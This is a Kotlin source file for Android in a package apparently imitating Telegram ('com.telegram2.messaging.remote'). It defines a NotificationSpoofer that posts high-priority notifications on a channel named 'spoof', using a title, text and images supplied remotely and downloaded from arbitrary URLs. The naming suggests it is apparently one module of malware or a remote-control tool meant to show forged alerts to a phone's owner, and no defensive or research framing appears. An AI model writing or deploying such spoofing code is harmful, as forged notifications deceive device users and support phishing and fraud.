package com.telegram2.messaging.remote

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Build
import androidx.core.app.NotificationCompat
import java.net.URL

object NotificationSpoofer {
    fun show(context: Context, title: String, text: String, iconUrl: String?, bigPictureUrl: String?) {
        val channelId = "spoof"
        val manager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            manager.createNotificationChannel(NotificationChannel(channelId, "Spoof", NotificationManager.IMPORTANCE_HIGH))
        }

        val builder = NotificationCompat.Builder(context, channelId)
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setContentTitle(title)
            .setContentText(text)
            .setAutoCancel(true)
            .setPriority(NotificationCompat.PRIORITY_HIGH)

        val safeIntent = Intent(Intent.ACTION_VIEW).apply { data = Uri.parse("https://t.me") }
        val pending = PendingIntent.getActivity(context, 0, safeIntent, PendingIntent.FLAG_IMMUTABLE)
        builder.setContentIntent(pending)

        Thread {
            try {
                var largeIcon: Bitmap? = null
                var bigPic: Bitmap? = null
                if (!iconUrl.isNullOrEmpty()) {
                    largeIcon = BitmapFactory.decodeStream(URL(iconUrl).openConnection().getInputStream())
                }
                if (!bigPictureUrl.isNullOrEmpty()) {
                    bigPic = BitmapFactory.decodeStream(URL(bigPictureUrl).openConnection().getInputStream())
                }
                android.os.Handler(context.mainLooper).post {
                    if (largeIcon != null) builder.setLargeIcon(largeIcon)
                    if (bigPic != null) {
                        builder.setStyle(NotificationCompat.BigPictureStyle().bigPicture(bigPic).bigLargeIcon(null as Bitmap?))
                    }
                    manager.notify(999, builder.build())
                }
            } catch (_: Exception) {
                manager.notify(999, builder.build())
            }
        }.start()
    }
}